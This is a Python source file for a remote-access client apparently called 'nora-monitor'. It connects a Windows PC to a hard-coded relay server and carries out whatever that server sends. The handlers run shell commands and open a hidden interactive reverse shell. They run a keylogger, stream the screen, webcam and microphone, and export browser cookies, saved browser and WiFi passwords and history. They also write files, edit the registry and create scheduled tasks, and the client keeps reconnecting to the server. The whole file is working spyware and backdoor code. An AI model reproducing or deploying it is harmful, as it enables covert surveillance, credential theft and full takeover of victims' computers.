"""
Connects the nora-monitor to the relay server as a Socket.IO client.

Set NORA_RELAY env var to the relay URL (default: http://84.200.81.161:5000).
The PC's hostname is used as the agent name; override with NORA_NAME.
"""

import os
import platform
import socket
import threading
import socketio

RELAY_URL = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
AGENT_NAME   = os.environ.get("NORA_NAME",   "") or platform.node() or socket.gethostname() or "agent"
AGENT_SECRET = os.environ.get("NORA_SECRET", "")

_sio = None
_controller = None
_recorder = None
_camera = None
_mic = None
_lock = threading.Lock()
_screen_recorder = None
_keylogger = None
_shell_proc = None
_upload_sessions = {}  # session_id -> {path, tmp, total, received}


def init(controller_fn, recorder, camera, mic=None):
    global _controller, _recorder, _camera, _mic
    _controller = controller_fn
    _recorder = recorder
    _camera = camera
    _mic = mic


def _emit(event, data):
    try:
        if _sio and _sio.connected:
            _sio.emit(event, data)
    except Exception:
        pass


def broadcast_frame(b64):      _emit("frame",        {"data": b64})
def broadcast_key(data):       _emit("key",          data if isinstance(data, dict) else {"char": data})
def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
def broadcast_audio(b64):      _emit("audio",        {"data": b64})


def _make_client():
    """Create a fresh Socket.IO client with all handlers registered."""
    global _sio
    sio = socketio.Client(reconnection=False, logger=False, engineio_logger=False)
    with _lock:
        _sio = sio

    @sio.on("connect")
    def _on_connect():
        print(f"[relay] connected to {RELAY_URL} as {AGENT_NAME}", flush=True)
        sio.emit("register", {"name": AGENT_NAME, "secret": AGENT_SECRET})

    @sio.on("command")
    def _on_command(data):
        if _controller:
            try: _controller(data)
            except Exception: pass

    @sio.on("get_processes")
    def _on_get_processes(data):
        try:
            import processes as proc
            procs = proc.get_processes()
            sio.emit("processes_result", {
                "processes": procs,
                "_requester": data.get("_requester"),
            })
        except Exception:
            pass

    @sio.on("kill_process")
    def _on_kill(data):
        try:
            import processes as proc
            proc.kill_process(int(data.get("pid", 0)))
        except Exception:
            pass

    @sio.on("list_dir")
    def _on_list_dir(data):
        try:
            import file_manager as fm
            path = data.get("path") or fm.home_dir()
            result = fm.list_dir(path)
            result["_requester"] = data.get("_requester")
            sio.emit("dir_result", result)
        except Exception:
            pass

    @sio.on("read_file")
    def _on_read_file(data):
        try:
            import file_manager as fm
            result = fm.read_file(data.get("path", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("file_data", result)
        except Exception:
            pass

    @sio.on("write_file")
    def _on_write_file(data):
        try:
            import file_manager as fm
            result = fm.write_file(data.get("path", ""), data.get("data", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("write_result", result)
        except Exception:
            pass

    @sio.on("delete_path")
    def _on_delete_path(data):
        try:
            import file_manager as fm
            result = fm.delete_path(data.get("path", ""))
            result["_requester"] = data.get("_requester")
            result["path"] = data.get("path", "")
            sio.emit("delete_result", result)
        except Exception:
            pass

    @sio.on("rename_path")
    def _on_rename_path(data):
        try:
            import file_manager as fm
            result = fm.rename_path(data.get("path", ""), data.get("new_name", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("rename_result", result)
        except Exception:
            pass

    @sio.on("copy_path")
    def _on_copy_path(data):
        try:
            import file_manager as fm
            result = fm.copy_path(data.get("src", ""), data.get("dst", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("copy_result", result)
        except Exception:
            pass

    @sio.on("move_path")
    def _on_move_path(data):
        try:
            import file_manager as fm
            result = fm.move_path(data.get("src", ""), data.get("dst", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("move_result", result)
        except Exception:
            pass

    @sio.on("upload_start")
    def _on_upload_start(data):
        try:
            import tempfile, uuid
            session_id = uuid.uuid4().hex[:12]
            path = data.get("path", "")
            total = data.get("size", 0)
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".nora_up")
            tmp.close()
            _upload_sessions[session_id] = {
                "path": path,
                "tmp": tmp.name,
                "total": total,
                "received": 0,
            }
            sio.emit("upload_ready", {
                "session_id": session_id,
                "_requester": data.get("_requester"),
            })
        except Exception as e:
            sio.emit("upload_result", {
                "ok": False, "error": str(e),
                "_requester": data.get("_requester"),
            })

    @sio.on("upload_chunk")
    def _on_upload_chunk(data):
        try:
            import base64 as _b64, os as _os, shutil
            session_id = data.get("session_id", "")
            sess = _upload_sessions.get(session_id)
            if not sess:
                sio.emit("upload_result", {
                    "ok": False, "error": "unknown session",
                    "_requester": data.get("_requester"),
                })
                return
            raw = _b64.b64decode(data.get("data", ""))
            with open(sess["tmp"], "ab") as f:
                f.write(raw)
            sess["received"] += len(raw)
            is_last = data.get("last", False)
            sio.emit("upload_progress", {
                "session_id": session_id,
                "received": sess["received"],
                "total": sess["total"],
                "_requester": data.get("_requester"),
            })
            if is_last:
                path = sess["path"]
                _os.makedirs(_os.path.dirname(_os.path.abspath(path)) or ".", exist_ok=True)
                shutil.move(sess["tmp"], path)
                del _upload_sessions[session_id]
                sio.emit("upload_result", {
                    "ok": True, "path": path,
                    "_requester": data.get("_requester"),
                })
        except Exception as e:
            sio.emit("upload_result", {
                "ok": False, "error": str(e),
                "_requester": data.get("_requester"),
            })

    @sio.on("win_capture_start")
    def _on_win_capture_start(data):
        try:
            import windows_control as wc
            hwnd = data.get("hwnd")
            if hwnd:
                wc.start_window_capture(int(hwnd), lambda b64: sio.emit("win_frame", {"data": b64}))
        except Exception:
            pass

    @sio.on("win_capture_stop")
    def _on_win_capture_stop(_data=None):
        try:
            import windows_control as wc
            wc.stop_window_capture()
        except Exception:
            pass

    @sio.on("list_windows")
    def _on_list_windows(data):
        try:
            import windows_control as wc
            wins = wc.list_windows()
            sio.emit("windows_list", {"windows": wins, "_requester": data.get("_requester") if data else None})
        except Exception:
            pass

    @sio.on("win_key")
    def _on_win_key(data):
        try:
            import windows_control as wc
            hwnd = data.get("hwnd")
            if hwnd:
                wc.send_key(int(hwnd), data.get("key", ""))
        except Exception:
            pass

    @sio.on("win_mouse")
    def _on_win_mouse(data):
        try:
            import windows_control as wc, mss
            hwnd = data.get("hwnd")
            if not hwnd:
                return
            with mss.mss() as s:
                m = s.monitors[1]
                sw_r, sh_r = m["width"], m["height"]
            sx = data.get("x", 0) / data.get("sw", sw_r) * sw_r
            sy = data.get("y", 0) / data.get("sh", sh_r) * sh_r
            wc.send_mouse(int(hwnd), sx, sy, data.get("action", "click"), data.get("button", 0))
        except Exception:
            pass

    @sio.on("desktop_cmd")
    def _on_desktop_cmd(data):
        try:
            import windows_control as wc
            {"new": wc.desktop_new, "left": wc.desktop_left,
             "right": wc.desktop_right, "close": wc.desktop_close}.get(data.get("cmd", ""), lambda: None)()
        except Exception:
            pass

    @sio.on("export_cookies")
    def _on_export_cookies(data):
        try:
            import cookie_manager as cm
            cookies = cm.export_all()
            sio.emit("cookies_data", {
                "cookies": cookies,
                "count": len(cookies),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("cookies_data", {
                "error": str(e), "cookies": [], "count": 0,
                "_requester": data.get("_requester") if data else None,
            })

    @sio.on("import_cookies")
    def _on_import_cookies(data):
        try:
            import cookie_manager as cm
            result = cm.import_all(data.get("cookies", []))
            result["_requester"] = data.get("_requester")
            sio.emit("import_result", result)
        except Exception as e:
            sio.emit("import_result", {"ok": False, "message": str(e), "_requester": data.get("_requester")})

    @sio.on("camera_on")
    def _on_cam_on(_data=None):
        if _camera:
            try: _camera.start()
            except Exception: pass

    @sio.on("camera_off")
    def _on_cam_off(_data=None):
        if _camera:
            try: _camera.stop()
            except Exception: pass

    @sio.on("mic_on")
    def _on_mic_on(_data=None):
        if _mic:
            try: _mic.start()
            except Exception: pass

    @sio.on("mic_off")
    def _on_mic_off(_data=None):
        if _mic:
            try: _mic.stop()
            except Exception: pass

    @sio.on("get_sysinfo")
    def _on_get_sysinfo(data):
        try:
            import sysinfo
            info = sysinfo.get_info()
            info["_requester"] = data.get("_requester") if data else None
            sio.emit("sysinfo_result", info)
        except Exception:
            pass

    @sio.on("get_history")
    def _on_get_history(data):
        try:
            import browser_history as bh
            limit = (data or {}).get("limit", 500)
            history = bh.export_all(limit=limit)
            sio.emit("history_result", {
                "history": history, "count": len(history),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("history_result", {
                "error": str(e), "history": [], "count": 0,
                "_requester": data.get("_requester") if data else None,
            })

    @sio.on("take_screenshot")
    def _on_take_screenshot(data):
        try:
            import mss as _mss, base64 as _b64
            from PIL import Image as _Img
            import io as _io
            with _mss.mss() as sct:
                shot = sct.grab(sct.monitors[1])
                img = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                buf = _io.BytesIO()
                img.save(buf, format="PNG")
                b64 = _b64.b64encode(buf.getvalue()).decode()
                sio.emit("screenshot_result", {
                    "data": b64,
                    "_requester": data.get("_requester") if data else None,
                })
        except Exception as e:
            sio.emit("screenshot_result", {
                "error": str(e),
                "_requester": data.get("_requester") if data else None,
            })

    @sio.on("clipboard_set")
    def _on_clipboard_set(data):
        try:
            import pyperclip
            pyperclip.copy(data.get("text", ""))
            sio.emit("clipboard_set_result", {
                "ok": True,
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("clipboard_set_result", {
                "ok": False, "error": str(e),
                "_requester": data.get("_requester") if data else None,
            })

    @sio.on("send_notification")
    def _on_send_notification(data):
        try:
            import wintools as wt
            result = wt.send_notification(data.get("title", "Nora"), data.get("message", ""))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("notification_result", result)
        except Exception as e:
            sio.emit("notification_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("get_wallpaper")
    def _on_get_wallpaper(data):
        try:
            import wintools as wt
            result = wt.get_wallpaper()
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("wallpaper_result", result)
        except Exception as e:
            sio.emit("wallpaper_result", {"path": "", "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("set_wallpaper")
    def _on_set_wallpaper(data):
        try:
            import wintools as wt
            result = wt.set_wallpaper(data.get("path", ""))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("set_wallpaper_result", result)
        except Exception as e:
            sio.emit("set_wallpaper_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("get_programs")
    def _on_get_programs(data):
        try:
            import wintools as wt
            programs = wt.list_installed_programs()
            sio.emit("programs_result", {
                "programs": programs, "count": len(programs),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("programs_result", {"error": str(e), "programs": [], "count": 0, "_requester": data.get("_requester") if data else None})

    @sio.on("get_netconns")
    def _on_get_netconns(data):
        try:
            import wintools as wt
            conns = wt.list_network_connections()
            sio.emit("netconns_result", {
                "connections": conns, "count": len(conns),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("netconns_result", {"error": str(e), "connections": [], "count": 0, "_requester": data.get("_requester") if data else None})

    @sio.on("get_startup")
    def _on_get_startup(data):
        try:
            import wintools as wt
            items = wt.list_startup_programs()
            sio.emit("startup_result", {
                "items": items, "count": len(items),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("startup_result", {"error": str(e), "items": [], "count": 0, "_requester": data.get("_requester") if data else None})

    @sio.on("remove_startup")
    def _on_remove_startup(data):
        try:
            import wintools as wt
            result = wt.remove_startup_program(data.get("name", ""), data.get("scope", "HKCU"))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("remove_startup_result", result)
        except Exception as e:
            sio.emit("remove_startup_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("volume_control")
    def _on_volume_control(data):
        try:
            import wintools as wt
            result = wt.volume_control(data.get("action", "mute"))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("volume_result", result)
        except Exception as e:
            sio.emit("volume_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("get_monitors")
    def _on_get_monitors(data):
        try:
            import wintools as wt
            monitors = wt.list_monitors()
            sio.emit("monitors_result", {
                "monitors": monitors,
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("monitors_result", {"monitors": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 1. Full desktop mouse control ─────────────────────────────────────────
    @sio.on("desktop_mouse")
    def _on_desktop_mouse(data):
        try:
            import pyautogui
            action = (data or {}).get("action", "click")
            x = data.get("x")
            y = data.get("y")
            if action == "move" and x is not None and y is not None:
                pyautogui.moveTo(x, y, duration=0.05)
            elif action in ("click", "left") and x is not None and y is not None:
                pyautogui.click(x, y)
            elif action == "right" and x is not None and y is not None:
                pyautogui.rightClick(x, y)
            elif action == "double" and x is not None and y is not None:
                pyautogui.doubleClick(x, y)
            elif action == "scroll":
                pyautogui.scroll(data.get("amount", 3), x=x, y=y)
            elif action == "drag":
                x2, y2 = data.get("x2", x), data.get("y2", y)
                pyautogui.dragTo(x2, y2, duration=data.get("duration", 0.3) / 1000)
            elif action == "mousedown":
                pyautogui.mouseDown(x, y, button=data.get("button", "left"))
            elif action == "mouseup":
                pyautogui.mouseUp(x, y, button=data.get("button", "left"))
            sio.emit("desktop_mouse_result", {"ok": True, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("desktop_mouse_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 2. Desktop keyboard typing ────────────────────────────────────────────
    @sio.on("desktop_type")
    def _on_desktop_type(data):
        try:
            import pyautogui
            text = (data or {}).get("text", "")
            key  = (data or {}).get("key")
            hotkey = (data or {}).get("hotkey")  # list like ["ctrl","c"]
            if hotkey:
                pyautogui.hotkey(*hotkey)
            elif key:
                pyautogui.press(key)
            elif text:
                pyautogui.typewrite(text, interval=0.02)
            sio.emit("desktop_type_result", {"ok": True, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("desktop_type_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 3. Power controls ─────────────────────────────────────────────────────
    @sio.on("power_action")
    def _on_power_action(data):
        try:
            import wintools as wt
            result = wt.power_action((data or {}).get("action", "lock"))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("power_result", result)
        except Exception as e:
            sio.emit("power_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 4. Run shell command ──────────────────────────────────────────────────
    @sio.on("run_command")
    def _on_run_command(data):
        try:
            import subprocess as _sp
            cmd = (data or {}).get("cmd", "")
            timeout = (data or {}).get("timeout", 30)
            result = _sp.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=timeout, errors="replace",
            )
            sio.emit("command_result", {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("command_result", {"error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 5. Upload file to PC ──────────────────────────────────────────────────
    @sio.on("upload_file")
    def _on_upload_file(data):
        try:
            import base64 as _b64, os as _os
            path  = (data or {}).get("path", "")
            b64   = (data or {}).get("data", "")
            raw   = _b64.b64decode(b64)
            _os.makedirs(_os.path.dirname(_os.path.abspath(path)) or ".", exist_ok=True)
            with open(path, "wb") as f:
                f.write(raw)
            sio.emit("upload_result", {"ok": True, "path": path, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("upload_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 6. WiFi saved passwords ───────────────────────────────────────────────
    @sio.on("get_wifi_passwords")
    def _on_get_wifi_passwords(data):
        try:
            import wintools as wt
            passwords = wt.get_wifi_passwords()
            sio.emit("wifi_passwords_result", {
                "passwords": passwords, "count": len(passwords),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("wifi_passwords_result", {"error": str(e), "passwords": [], "count": 0, "_requester": data.get("_requester") if data else None})

    # ── 7. Webcam snapshot ────────────────────────────────────────────────────
    @sio.on("webcam_snapshot")
    def _on_webcam_snapshot(data):
        try:
            import wintools as wt, base64 as _b64
            jpeg = wt.webcam_snapshot()
            sio.emit("webcam_snapshot_result", {
                "data": _b64.b64encode(jpeg).decode(),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("webcam_snapshot_result", {"error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 8a. Active window title ───────────────────────────────────────────────
    @sio.on("get_active_window")
    def _on_get_active_window(data):
        try:
            import wintools as wt
            result = wt.get_active_window()
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("active_window_result", result)
        except Exception as e:
            sio.emit("active_window_result", {"title": "", "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── 8b. Screen recording ──────────────────────────────────────────────────
    @sio.on("start_recording")
    def _on_start_recording(data):
        global _screen_recorder
        try:
            import mss as _mss, cv2 as _cv2, tempfile as _tmp, os as _os, time as _time
            if _screen_recorder and _screen_recorder.get("running"):
                sio.emit("recording_result", {"ok": False, "error": "already recording", "_requester": data.get("_requester") if data else None})
                return
            fps   = (data or {}).get("fps", 10)
            limit = (data or {}).get("limit", 30)  # max seconds
            tmp   = _tmp.NamedTemporaryFile(suffix=".mp4", delete=False)
            tmp.close()
            state = {"running": True, "path": tmp.name, "requester": data.get("_requester") if data else None}
            _screen_recorder = state

            def _record():
                with _mss.mss() as sct:
                    mon = sct.monitors[1]
                    w, h = mon["width"] // 2, mon["height"] // 2
                    fourcc = _cv2.VideoWriter_fourcc(*"mp4v")
                    out = _cv2.VideoWriter(state["path"], fourcc, fps, (w, h))
                    try:
                        start = _time.time()
                        while state["running"] and (_time.time() - start) < limit:
                            shot = sct.grab(mon)
                            from PIL import Image as _I
                            img = _I.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                            img = img.resize((w, h))
                            import numpy as _np
                            frame = _np.array(img)
                            out.write(_cv2.cvtColor(frame, _cv2.COLOR_RGB2BGR))
                            _time.sleep(1 / fps)
                    finally:
                        out.release()
                        state["running"] = False

            t = threading.Thread(target=_record, daemon=True, name="screen-rec")
            t.start()
            state["thread"] = t
            sio.emit("recording_started", {"ok": True, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("recording_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("stop_recording")
    def _on_stop_recording(data):
        global _screen_recorder
        try:
            import base64 as _b64, os as _os
            if not _screen_recorder:
                sio.emit("recording_result", {"ok": False, "error": "not recording", "_requester": data.get("_requester") if data else None})
                return
            _screen_recorder["running"] = False
            t = _screen_recorder.get("thread")
            if t:
                t.join(timeout=10)
            path = _screen_recorder.get("path", "")
            requester = _screen_recorder.get("requester") or (data.get("_requester") if data else None)
            _screen_recorder = None
            if path and _os.path.exists(path):
                with open(path, "rb") as f:
                    raw = f.read()
                _os.unlink(path)
                sio.emit("recording_result", {
                    "ok": True,
                    "data": _b64.b64encode(raw).decode(),
                    "_requester": requester,
                })
            else:
                sio.emit("recording_result", {"ok": False, "error": "output file missing", "_requester": requester})
        except Exception as e:
            sio.emit("recording_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Keylogger ─────────────────────────────────────────────────────────────
    @sio.on("keylog_on")
    def _on_keylog_on(data):
        global _keylogger
        if _keylogger:
            return
        try:
            from pynput import keyboard as _kb
            def _on_press(key):
                try:
                    char = key.char or ""
                except AttributeError:
                    char = f"[{key.name}]"
                _emit("key", {"char": char, "source": "keylog"})
            listener = _kb.Listener(on_press=_on_press)
            listener.daemon = True
            listener.start()
            _keylogger = listener
            sio.emit("keylog_status", {"running": True, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("keylog_status", {"running": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("keylog_off")
    def _on_keylog_off(data):
        global _keylogger
        if _keylogger:
            try: _keylogger.stop()
            except Exception: pass
            _keylogger = None
        sio.emit("keylog_status", {"running": False, "_requester": data.get("_requester") if data else None})

    # ── Reverse shell ─────────────────────────────────────────────────────────
    @sio.on("shell_start")
    def _on_shell_start(data):
        global _shell_proc
        if _shell_proc and _shell_proc.poll() is None:
            sio.emit("shell_started", {"ok": False, "error": "shell already running"})
            return
        try:
            import subprocess as _sp
            shell = (data or {}).get("shell", "cmd.exe")
            proc = _sp.Popen(
                [shell], stdin=_sp.PIPE, stdout=_sp.PIPE, stderr=_sp.STDOUT,
                creationflags=0x08000000, bufsize=0,
            )
            _shell_proc = proc
            def _read():
                while proc.poll() is None:
                    try:
                        line = proc.stdout.readline()
                        if line:
                            sio.emit("shell_output", {"data": line.decode(errors="replace")})
                    except Exception:
                        break
                sio.emit("shell_output", {"data": "", "closed": True})
                global _shell_proc
                _shell_proc = None
            threading.Thread(target=_read, daemon=True, name="shell-out").start()
            sio.emit("shell_started", {"ok": True})
        except Exception as e:
            sio.emit("shell_started", {"ok": False, "error": str(e)})

    @sio.on("shell_input")
    def _on_shell_input(data):
        if not _shell_proc or _shell_proc.poll() is not None:
            return
        try:
            cmd = (data or {}).get("cmd", "") + "\n"
            _shell_proc.stdin.write(cmd.encode(errors="replace"))
            _shell_proc.stdin.flush()
        except Exception:
            pass

    @sio.on("shell_stop")
    def _on_shell_stop(data):
        global _shell_proc
        if _shell_proc:
            try: _shell_proc.kill()
            except Exception: pass
            _shell_proc = None

    # ── Drive list ────────────────────────────────────────────────────────────
    @sio.on("get_drives")
    def _on_get_drives(data):
        try:
            import wintools as wt
            drives = wt.list_drives()
            sio.emit("drives_result", {"drives": drives, "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("drives_result", {"drives": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── File search ───────────────────────────────────────────────────────────
    @sio.on("search_files")
    def _on_search_files(data):
        try:
            import os as _os, fnmatch as _fn
            root    = (data or {}).get("path", _os.path.expanduser("~"))
            pattern = (data or {}).get("pattern", "*")
            content = (data or {}).get("content", "")
            limit   = (data or {}).get("limit", 200)
            matches = []
            for dirpath, _, files in _os.walk(root):
                for fname in files:
                    if _fn.fnmatch(fname.lower(), pattern.lower()):
                        full = _os.path.join(dirpath, fname)
                        if content:
                            try:
                                with open(full, "r", errors="replace") as f:
                                    if content.lower() not in f.read().lower():
                                        continue
                            except Exception:
                                continue
                        matches.append(full)
                        if len(matches) >= limit:
                            break
                if len(matches) >= limit:
                    break
            sio.emit("search_result", {"matches": matches, "count": len(matches), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("search_result", {"matches": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Windows event logs ────────────────────────────────────────────────────
    @sio.on("get_event_logs")
    def _on_get_event_logs(data):
        try:
            import wintools as wt
            log   = (data or {}).get("log", "Security")
            count = (data or {}).get("count", 50)
            entries = wt.get_event_logs(log, count)
            sio.emit("event_logs_result", {"entries": entries, "count": len(entries), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("event_logs_result", {"entries": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Registry ──────────────────────────────────────────────────────────────
    @sio.on("registry_get")
    def _on_registry_get(data):
        try:
            import wintools as wt
            result = wt.registry_get(
                (data or {}).get("hive", "HKCU"),
                (data or {}).get("path", ""),
                (data or {}).get("name", ""),
            )
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("registry_result", result)
        except Exception as e:
            sio.emit("registry_result", {"error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("registry_set")
    def _on_registry_set(data):
        try:
            import wintools as wt
            result = wt.registry_set(
                (data or {}).get("hive", "HKCU"),
                (data or {}).get("path", ""),
                (data or {}).get("name", ""),
                (data or {}).get("value", ""),
                (data or {}).get("type", "REG_SZ"),
            )
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("set_registry_result", result)
        except Exception as e:
            sio.emit("set_registry_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Environment variables ─────────────────────────────────────────────────
    @sio.on("get_env_vars")
    def _on_get_env_vars(data):
        try:
            import wintools as wt
            env = wt.get_env_vars()
            sio.emit("env_vars_result", {"vars": env, "count": len(env), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("env_vars_result", {"vars": {}, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── User accounts ─────────────────────────────────────────────────────────
    @sio.on("get_users")
    def _on_get_users(data):
        try:
            import wintools as wt
            users = wt.list_user_accounts()
            sio.emit("users_result", {"users": users, "count": len(users), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("users_result", {"users": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Scheduled tasks ───────────────────────────────────────────────────────
    @sio.on("get_scheduled_tasks")
    def _on_get_scheduled_tasks(data):
        try:
            import wintools as wt
            tasks = wt.list_scheduled_tasks()
            sio.emit("scheduled_tasks_result", {"tasks": tasks, "count": len(tasks), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("scheduled_tasks_result", {"tasks": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("create_scheduled_task")
    def _on_create_task(data):
        try:
            import wintools as wt
            result = wt.create_scheduled_task(
                (data or {}).get("name", "NoraTask"),
                (data or {}).get("command", ""),
                (data or {}).get("trigger_time", ""),
            )
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("create_task_result", result)
        except Exception as e:
            sio.emit("create_task_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("delete_scheduled_task")
    def _on_delete_task(data):
        try:
            import wintools as wt
            result = wt.delete_scheduled_task((data or {}).get("name", ""))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("delete_task_result", result)
        except Exception as e:
            sio.emit("delete_task_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Audio playback ────────────────────────────────────────────────────────
    @sio.on("play_audio")
    def _on_play_audio(data):
        try:
            import wintools as wt
            result = wt.play_audio((data or {}).get("path", ""))
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("audio_play_result", result)
        except Exception as e:
            sio.emit("audio_play_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Clipboard history ─────────────────────────────────────────────────────
    @sio.on("get_clipboard_history")
    def _on_get_clipboard_history(data):
        try:
            import wintools as wt
            result = wt.get_clipboard_history()
            result["_requester"] = data.get("_requester") if data else None
            sio.emit("clipboard_history_result", result)
        except Exception as e:
            sio.emit("clipboard_history_result", {"current": "", "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── LAN scan ──────────────────────────────────────────────────────────────
    @sio.on("lan_scan")
    def _on_lan_scan(data):
        try:
            import wintools as wt
            devices = wt.lan_scan()
            sio.emit("lan_scan_result", {"devices": devices, "count": len(devices), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("lan_scan_result", {"devices": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── DNS cache ─────────────────────────────────────────────────────────────
    @sio.on("get_dns_cache")
    def _on_get_dns_cache(data):
        try:
            import wintools as wt
            entries = wt.get_dns_cache()
            sio.emit("dns_cache_result", {"entries": entries, "count": len(entries), "_requester": data.get("_requester") if data else None})
        except Exception as e:
            sio.emit("dns_cache_result", {"entries": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Browser saved passwords ───────────────────────────────────────────────
    @sio.on("get_browser_passwords")
    def _on_get_browser_passwords(data):
        try:
            import wintools as wt
            passwords = wt.get_browser_passwords()
            sio.emit("browser_passwords_result", {
                "passwords": passwords, "count": len(passwords),
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("browser_passwords_result", {"passwords": [], "error": str(e), "_requester": data.get("_requester") if data else None})

    # ── Privacy Screen ────────────────────────────────────────────────────────
    @sio.on("privacy_start")
    def _on_privacy_start(data):
        try:
            import privacy_screen as ps
            ok, msg = ps.start_privacy_screen(
                message=(data or {}).get("message"),
                pin=(data or {}).get("pin"),
                overlay_image=(data or {}).get("overlay_image"),
                overlay_html=(data or {}).get("overlay_html"),
            )
            sio.emit("privacy_result", {
                "ok": ok, "running": ok,
                "status": "active" if ok else "error",
                "message": msg,
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("privacy_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    @sio.on("privacy_stop")
    def _on_privacy_stop(data):
        try:
            import privacy_screen as ps
            ok, reason = ps.stop_privacy_screen(pin=(data or {}).get("pin"))
            sio.emit("privacy_result", {
                "ok": ok, "running": not ok,
                "status": "inactive" if ok else "active",
                "message": reason,
                "_requester": data.get("_requester") if data else None,
            })
        except Exception as e:
            sio.emit("privacy_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})

    return sio


def _connect_loop():
    import time
    backoff = 5
    while True:
        sio = _make_client()
        try:
            sio.connect(RELAY_URL, transports=["websocket", "polling"])
            backoff = 5
            sio.wait()
        except Exception as e:
            print(f"[relay] connection failed: {e}", flush=True)
        try:
            sio.disconnect()
        except Exception:
            pass
        print(f"[relay] reconnecting in {backoff}s...", flush=True)
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)


def run():
    """Start the relay client in a background daemon thread."""
    t = threading.Thread(target=_connect_loop, daemon=True, name="relay-client")
    t.start()
